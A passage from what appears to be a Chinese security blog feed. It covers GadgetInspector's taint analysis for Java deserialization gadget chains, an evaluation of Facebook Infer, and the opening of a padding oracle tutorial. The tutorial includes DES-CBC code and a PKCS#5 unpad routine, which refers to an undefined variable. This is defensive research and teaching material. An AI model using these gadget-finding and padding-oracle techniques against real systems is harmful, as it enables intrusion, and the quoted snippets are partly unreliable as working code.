调用函数传递参数idx，路径，被调函数传入参数idx</span><br></pre></td></tr></table></figure><p>构图时，只考虑存在污点的边：</p><p><img src="/deserialize-AutoFindPOP/1566215882715.png" alt="1566215882715"></p><p>这里发现gadgetinspector.TaintTrackingMethodVisitor#getStackTaint有点问题，每次get的时候并未拿到Taint</p><h2 id="Step4"><a href="#Step4" class="headerlink" title="Step4"></a>Step4</h2><p>枚举入口，如hashCode，toString，程序只能发现已知入口的POP链</p><p><img src="/deserialize-AutoFindPOP/1566120657753.png" alt="1566120657753"></p><p>Output：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Source&gt; discoveredSources</span><br><span class="line">Source(sourceMethod, taintedArgIndex) <span class="comment">//index0=this</span></span><br></pre></td></tr></table></figure><h2 id="Step5"><a href="#Step5" class="headerlink" title="Step5"></a>Step5</h2><p>BFS搜索图找到chains</p><p><img src="/deserialize-AutoFindPOP/1566302159606.png" alt="1566302159606"></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>断点打gadgetinspector.GadgetInspector#main</p><h2 id="污点传播（Step2-Step3）"><a href="#污点传播（Step2-Step3）" class="headerlink" title="污点传播（Step2-Step3）"></a>污点传播（Step2-Step3）</h2><p>Step2-Step3都是通过ASM做的，例如Step3：</p><p><img src="/deserialize-AutoFindPOP/1566214430085.png" alt="1566214430085"></p><p>其中继承了基本Visitor：</p><p>gadgetinspector.TaintTrackingMethodVisitor，该类模拟函数执行，主要污点传播逻辑都在这</p><h3 id="visitMethodInsn"><a href="#visitMethodInsn" class="headerlink" title="visitMethodInsn"></a>visitMethodInsn</h3><p>字节码调用函数时会触发该函数，对于污点传播而言，应该做如下事情</p><ul><li>从堆栈取出参数</li><li>检查函数的参数是否存在污点</li><li>返回函数结果是否存在污点</li><li>将结果推入堆栈</li></ul><p>实际上就是模拟了一个函数的调用过程，如果函数中有嵌套调用那么情况会更复杂</p><p>其属性savedVariableState.StackVars记录着函数参数，及其是否有污点：</p><p><img src="/deserialize-AutoFindPOP/1567047086609.png" alt="1567047086609"></p><p>如上图，该函数（StringBuilder.append()）有两个参数，第一个参数是this，有污点，第二个参数无污点。</p><h3 id="特殊的传播"><a href="#特殊的传播" class="headerlink" title="特殊的传播"></a>特殊的传播</h3><p>在gadgetinspector.TaintTrackingMethodVisitor#PASSTHROUGH_DATAFLOW处定义了一些特殊的传播，保证污点能够向后传播，比如说String类型<code>A+Taint</code>的传播，idx1，idx2，idx3分别是类，函数名，函数签名，后面是能够传播的污点参数idx，如StringBuilder.append()会将参数0，参数1传播：</p><p><img src="/deserialize-AutoFindPOP/1566974563078.png" alt="1566974563078"></p><p>而gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn这里需要处理函数参数调用传播污点的情况，如<code>A(B(xxx))</code></p><h2 id="SINK点"><a href="#SINK点" class="headerlink" title="SINK点"></a>SINK点</h2><p>Sink点定义在gadgetinspector.GadgetChainDiscovery#isSink：</p><p><img src="/deserialize-AutoFindPOP/1566288878759.png" alt="1566288878759"></p><h2 id="判断该类是否可以反序列化"><a href="#判断该类是否可以反序列化" class="headerlink" title="判断该类是否可以反序列化"></a>判断该类是否可以反序列化</h2><p>对于java原生序列化，判断逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#applyNoCache，其他序列化方法找对应的包名。</p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>对于java原生序列化，逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#isBlacklistedClass，可以追加黑名单。</p><h1 id="程序的一个Issue"><a href="#程序的一个Issue" class="headerlink" title="程序的一个Issue"></a>程序的一个Issue</h1><p>原版污点传播存在一个Bug，考虑如下情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里程序无法发现gadget，因为在读取getcmd()字节码后，污点传播执行如下代码（TaintTrackingMethodVisitor.java#L675）向外传播污点：</p><p><img src="/deserialize-AutoFindPOP/1566980149628.png" alt="1566980149628"></p><p>这一意思是说，如果passthroughDataflow（第二步）计算得到getcmd能够传播污点，那么该污点将作为参数推入堆栈（即传播到exec()函数参数上），但是这里的passthroughDataflow并没有B.getcmd()的记录，只有A.getcmd()记录——因为B.getcmd()继承A.getcmd()，因此污点传播中断了。</p><p>因此需要寻找其父类查看是否有该方法，将图中的代码块换成如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (passthroughDataflow != <span class="keyword">null</span>) &#123;</span><br><span class="line">    Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle);</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs == <span class="keyword">null</span> &amp;&amp; inheritanceMap!=<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// FIXME ClassA-&gt;ClassB-&gt;ClassC</span></span><br><span class="line">        <span class="comment">//  ClassA.func(), ClassB.func(), ClassC.func()==ClassB.func()!=ClassA.func();</span></span><br><span class="line">        <span class="comment">//  now taint will passthrough if ClassB.func() or ClassA.func() can passthrough.</span></span><br><span class="line">        <span class="comment">//  So FP will arrise.</span></span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses=inheritanceMap.getSuperClasses(clzHandle);</span><br><span class="line">        <span class="keyword">if</span>(superClasses!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle superClzHandle: superClasses)&#123;</span><br><span class="line">                List&lt;Set&lt;Integer&gt;&gt; list=passthroughDataflow.entrySet().stream()</span><br><span class="line">                        .filter(e-&gt;(e.getKey().getClassReference().equals(superClzHandle)</span><br><span class="line">                                &amp;&amp; e.getKey().getName().equals(name)</span><br><span class="line">                                &amp;&amp; e.getKey().getDesc().equals(desc)))</span><br><span class="line">                        .map(e-&gt;e.getValue())</span><br><span class="line">                        .collect(Collectors.toList());</span><br><span class="line">                <span class="keyword">if</span>(!list.isEmpty())&#123;</span><br><span class="line">                    passthroughArgs=list.get(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> arg : passthroughArgs) &#123;</span><br><span class="line">            resultTaint.addAll(argTaint.get(arg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样就还存在一个问题，因为gadgetinspector.data.InheritanceMap#getSuperClasses返回的是一个集合，因此，我们并没法知道真实调用exec()的是哪一个函数：</p><p><img src="/deserialize-AutoFindPOP/1566981439728.png" alt="1566981439728"></p><p>考虑如下例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"whoami"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，前面的代码会返回getcmd()传播污点——父类的任意一个getcmd()能传污点就有污点，但是实际上其并没有污点，因为实际上getcmd()调用的是B.getcmd()，因此会产生误报，预计使用接口的话这一点会更加明显。</p><h1 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h1><ul><li><p>无视控制流，导致误报</p></li><li><p>无法识别反射的SINK点，导致漏报</p></li></ul><p><strong>相关代码：</strong><a href="https://github.com/Anemone95/gadgetinspector" target="_blank" rel="noopener">https://github.com/Anemone95/gadgetinspector</a></p><h1 id="附录：ASM源码"><a href="#附录：ASM源码" class="headerlink" title="附录：ASM源码"></a>附录：ASM源码</h1><p>其污点传播用ASM做的，因此记一下关于ASM的一些使用方法</p><h2 id="ClassReader"><a href="#ClassReader" class="headerlink" title="ClassReader"></a>ClassReader</h2><h2 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h2><p>定义在读取Class字节码时会触发的事件，如类头解析完成、注解解析、字段解析、方法解析等。</p><h2 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h2><p>定义在解析方法时触发的事件，如方法上的注解、属性、代码等。这里只是操作码不含操作数</p><p>visitInsn：IALOAD~SALOAD触发该函数</p><p>visitVarInsn(opcode, var)：ILOAD~ALOAD触发该函数，var为操作数</p><p>B4 getfield</p>]]></content>
      
      
      <categories>
          
          <category> Web安全-反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> Javam </tag>
            
            <tag> 自动化 </tag>
            
            <tag> 污点传播 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Infer试用以及扫描原理分析</title>
      <link href="/whitebox-infer/"/>
      <url>/whitebox-infer/</url>
      
        <content type="html"><![CDATA[<p>Infer作为facebook 开源的使用 ocaml 开发静态代码检测工具，作为公司的产品调研对象，本文就其使用和原理两方面进行分析。</p><p>GitHub：<a href="https://github.com/facebook/infer" target="_blank" rel="noopener">https://github.com/facebook/infer</a></p><p>教程：<a href="https://infer.liaohuqiu.net/" target="_blank" rel="noopener">https://infer.liaohuqiu.net/</a></p><a id="more"></a><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Gradle</span></span><br><span class="line">infer -- gradle &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line">infer -- ./gradlew &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line"><span class="comment"># Maven</span></span><br><span class="line">infer -- mvn &lt;maven target&gt;</span><br></pre></td></tr></table></figure><h1 id="检测能力"><a href="#检测能力" class="headerlink" title="检测能力"></a>检测能力</h1><p>官网上看到能够检测到的问题有：</p><p>Java：</p><ul><li>Resource Leak</li><li>Null dereference</li></ul><p>C and Objective-C</p><ul><li>Resource leak</li><li>Memory leak</li><li>Null dereference</li><li>Parameter not null checked</li><li>Ivar not null checked</li><li>Premature nil termination argument</li></ul><p>Bugs reported only in Objective-C</p><ul><li>Retain cycle</li></ul><p>参见：<a href="https://infer.liaohuqiu.net/docs/infer-bug-types.html" target="_blank" rel="noopener">https://infer.liaohuqiu.net/docs/infer-bug-types.html</a></p><p>但是定位到源代码：<a href="https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。" target="_blank" rel="noopener">https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。</a></p><h1 id="试用"><a href="#试用" class="headerlink" title="试用"></a>试用</h1><p>Webgoat检测到16个问题，14个空引用和2个资源泄露：</p><p><img src="/whitebox-infer/1566373102585.png" alt="1566373102585"></p><p>扫描InsecureBankv2:</p><p><img src="/whitebox-infer/1566370930925.png" alt="1566370930925"></p><h1 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h1><ul><li><p>增量分析</p></li><li><p>能够分析大规模程序</p></li></ul><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><a href="https://infer.liaohuqiu.net/docs/separation-logic-and-bi-abduction.html" target="_blank" rel="noopener">分离逻辑（separation logic）和双向假说推理（bi-abduction）</a>，<a href="https://en.wikipedia.org/wiki/Hoare_logic" target="_blank" rel="noopener">霍尔逻辑</a>和<a href="https://en.wikipedia.org/wiki/Abstract_interpretation" target="_blank" rel="noopener">抽象解释</a>，分离逻辑用来检测bug，双向假说推理用来做增量分析。</p><h2 id="分离逻辑"><a href="#分离逻辑" class="headerlink" title="分离逻辑"></a>分离逻辑</h2><p>一开始用于内存管理的逻辑</p><script type="math/tex; mode=display">x\mapsto y * y\mapsto x</script><p>$x \mapsto y$ 指指针x指向值y（x points to y），$A*B$指A和B处于分离的两块内存中（and separately），因此以上公式被叫做（x 指向y，同时y指向x），可以用下图表示：</p><p><img src="/whitebox-infer/SepSplit.jpg" alt="static/images/SepSplit.jpg"></p><p>接着使用Hoare三元组$\{pre\}prog\{post\}$，表示程序行为，$pre$指前置条件，$prog$指程序片段$post$为后置条件。例如使用Hoare三元组描述一个关闭资源的函数：</p><script type="math/tex; mode=display">\{r\mapsto open\}closeResource(r)\{r\mapsto closed\}(spec)</script><p>它说明，一个正确的关闭资源的函数运行前，r资源应该是打开的，运行后r资源应该是关闭的，如果不符合则代码有问题。</p><p>那么若有两个资源$r_1$和$r_2$仅关闭$r_1$可以表示成：</p><script type="math/tex; mode=display">\{r_1\mapsto open * r_2\mapsto open\}closeResource(r_1)\{r_1\mapsto closed * r_2\mapsto open\}(use)</script><p>这里使用了一个小规范（spec）去更新了一个大规范（use），更一般的，我们有：</p><script type="math/tex; mode=display">\{pre\}prog\{post\}\rightarrow\{pre*frame\}prog\{post*frame\}</script><p>这一规则也被称为逻辑分离中的frame规则，$frame$描述了不变的状态，属于来自于就像动画场景中背景（frame）——动画场景中背景不会变。</p><p>这一规则用于数学推理，它揭示了逻辑推理应该聚焦于程序访问资源的那一块逻辑，并且分离的两块可以独立分析。</p><h2 id="双向假说推理"><a href="#双向假说推理" class="headerlink" title="双向假说推理"></a>双向假说推理</h2><p>A推出B表示为：</p><script type="math/tex; mode=display">A \vdash B</script><p>在传统逻辑推理中，一个推理问题被定义为：</p><ul><li><p>给定假设A和目标G</p></li><li><p>找到一个M，使如下公式成立：</p><script type="math/tex; mode=display">A \land M \vdash G</script></li></ul><p>应用到分离逻辑问题，即：</p><script type="math/tex; mode=display">A * M \vdash G</script><p>双向假说推理将问题拓展成：</p><script type="math/tex; mode=display">A*?antiframe \vdash G*?frame</script><p>即infer需要找到一对$antiframe$和$frame$让上式成立。</p><p>这在做增量扫描是很重要。</p><p>为了说明问题，例如我们有如下函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">lst_nd* <span class="title">q</span><span class="params">(lst_nd *y)</span> </span>&#123; <span class="comment">// Inferred Pre: list(y) </span></span><br><span class="line">    lst_nd *x, *z;</span><br><span class="line">    x=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); x-&gt;tail=<span class="number">0</span>;</span><br><span class="line">    z=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); z-&gt;tail=<span class="number">0</span>; <span class="comment">// Abducted: list(y), Framed: z|-&gt;0 </span></span><br><span class="line">    merge(x,y); <span class="comment">// Obtained Post: list(x)*z|-&gt;0 </span></span><br><span class="line">    merge(x,z); <span class="comment">// Obtained Post: list(x) </span></span><br><span class="line">    <span class="keyword">return</span>(x);</span><br><span class="line">&#125; <span class="comment">// Inferred Post: list(ret)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(lst_nd *x,lst_nd *y)</span></span>&#123;<span class="comment">//SUMMARY ONLY </span></span><br><span class="line">    <span class="comment">// Given Pre: list(x) * list(y)</span></span><br><span class="line">    <span class="comment">// x=x+y</span></span><br><span class="line">&#125; <span class="comment">// Given Post: list(x)</span></span><br></pre></td></tr></table></figure><p>要分析merge有没有空指针，有</p><script type="math/tex; mode=display">\{x\mapsto list * y\mapsto list\}merge(x,y)\{x\mapsto list\}</script><p>如果开始分析q到第5行，我们有：</p><script type="math/tex; mode=display">A=x\mapsto 0 *z \mapsto 0</script><p>但是我们的前提条件是$G=x\mapsto list * y\mapsto list$那么开始推导：</p><script type="math/tex; mode=display">x\mapsto0 *z \mapsto 0 * ?antiframe \vdash x\mapsto list * y \mapsto list * ?frame</script><p>因此 $antiframe=y\mapsto list$且$frame=z\mapsto 0$，这说明，如果想要分析q()函数有没有空指针，那么我们现在只需要分析$y\mapsto list$是成立就行了。</p><p><strong>这意味着，如果将来发新版本，若q()函数不变，则不需要再分析该函数，只需要分析改变的那些函数有没有改变$y \mapsto list$即可。</strong></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Infer目前的检测能力只局限于空指针和数据泄露问题，然而在检测项中发现了更多，怀疑是开源的是缩水的版本，而其增量分析的思想值得扫描器借鉴，其可用来完成commit级别的SAST和Serveless的安全检测。</p>]]></content>
      
      
      <categories>
          
          <category> 源码安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码安全 </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Infer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaddingOracle攻击</title>
      <link href="/crypto-PaddingOracle%E6%94%BB%E5%87%BB/"/>
      <url>/crypto-PaddingOracle%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="CBC加密原理"><a href="#CBC加密原理" class="headerlink" title="CBC加密原理"></a>CBC加密原理</h1><p>先预习下CBC的加解密原理吧。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>如下图所示，CBC的加密步骤如下：</p><ol><li>对明文分组，每组长度通常为8或16字节，末尾分组需要填充，通常填充采用PKCS#5标准；</li><li>生成初始化向量IV，长度为分组长度；</li><li>对于第一个明文分组，先由IV异或明文分组1得到中间值，再通过对称加密（DES/AEC/etc）得到密文分组1；</li><li>对于接下来的分组，由上一个密文分组替代IV算得中间值，再通过对称加密（DES/AEC/etc）得到密文分组2,3,4……</li></ol><a id="more"></a><p><img src="/crypto-PaddingOracle攻击/1563006823645.png" alt="加密"></p><p>给出加密的Java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String plain, String key)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] plainBytes = plain.getBytes(charset);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);<span class="comment">//"算法/模式/补码方式"</span></span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, keySpec);</span><br><span class="line">    <span class="keyword">byte</span>[] iv = cipher.getIV();</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = cipher.doFinal(plain.getBytes(charset));</span><br><span class="line">    <span class="keyword">return</span> bytes2HexStr(iv)+<span class="string">"::"</span>+bytes2HexStr(encrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，算法输入是明文（plain）和密钥（key），返回是初始化向量（iv）和加密后的密文（encrypted）。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>如下图所示，CBC的解密步骤如下：</p><ol><li>将密文分组；</li><li>对于第一个密文分组，先经过对称加密算法解密得到中间值，再由初始化向量IV异或中间值得到明文分组1；</li><li>对于接下来的密文分组，由经过对称加密算法解密得到中间值，再上一个密文分组代替IV异或得到明文分组2,3,4……；</li></ol><p><img src="/crypto-PaddingOracle攻击/1563012736837.png" alt="1563012736837"></p><p>给出Java版解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String secret, String key, String iv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] secretBytes = hexStr2Bytes(secret);<span class="comment">//先用base64解密</span></span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = hexStr2Bytes(iv);</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivs = <span class="keyword">new</span> IvParameterSpec(ivBytes);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, keySpec, ivs);</span><br><span class="line">    <span class="keyword">byte</span>[] plain = cipher.doFinal(secretBytes);</span><br><span class="line">    String plainString = <span class="keyword">new</span> String(plain,charset);</span><br><span class="line">    <span class="keyword">return</span> plainString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见输入是密文（secret）、密码（key）、初始化向量（iv）——这正与加密的输入对应，输出是明文（plainString）。</p><h2 id="PKCS-5填充方案"><a href="#PKCS-5填充方案" class="headerlink" title="PKCS#5填充方案"></a>PKCS#5填充方案</h2><p>这里再提一下PKCS#5方案，简单说就是缺多少位补多少，补内容就是缺位数的int值，例如：需要加密的串为“FIG”，而分组长度为8，那么缺5位，因此补完为“FIG\x05\x05\x05\x05\x05”，注意即使长度正巧为8，也需要补上一个完整分组，以检查加密正确性。</p><p><img src="/crypto-PaddingOracle攻击/1999562-43a6dede0db2bd18.png" alt="img"></p><p>在解密完最后一个分组后，先会检查Padding是否合法（注意，这是发起Oracle Padding攻击的关键）</p><p>com.sun.crypto.provider.CipherCore#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">int</span> len, <span class="keyword">byte</span>[] intermidVal)</span> <span class="keyword">throws</span> BadPaddingException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="keyword">this</span>.padding.unpad(intermidVal, <span class="number">0</span>, len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BadPaddingException(<span class="string">"Given final block not properly padded. Such issues can arise if a bad key is used during decryption."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.sun.crypto.provider.PKCS5Padding#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> plain 解密字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startIdx 开始下标</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> length 字符串长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> paddingVal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">byte</span>[] plain, <span class="keyword">int</span> startIdx, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (plain != <span class="keyword">null</span> &amp;&amp; length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> totalLength = Math.addExact(startIdx, length);</span><br><span class="line">        <span class="keyword">byte</span> tailVal = plain[totalLength - <span class="number">1</span>]; <span class="comment">// 解密后明文的最后一个字符</span></span><br><span class="line">        <span class="keyword">int</span> unsignedTailVal = tailVal &amp; <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (unsignedTailVal &gt;= <span class="number">1</span> &amp;&amp; unsignedTailVal &lt;= <span class="keyword">this</span>.blockSize) &#123;</span><br><span class="line">            <span class="keyword">int</span> paddingStartIdx = totalLength - unsignedTailVal;</span><br><span class="line">            <span class="comment">// tailVal==unsignedTailVal</span></span><br><span class="line">            <span class="keyword">if</span> (paddingVal &lt; startIdx) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = paddingStartIdx; i &lt; totalLength; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (plain[i] != tailVal) &#123;</span><br><span class="line">                        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> paddingVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="推导原中间值"><a 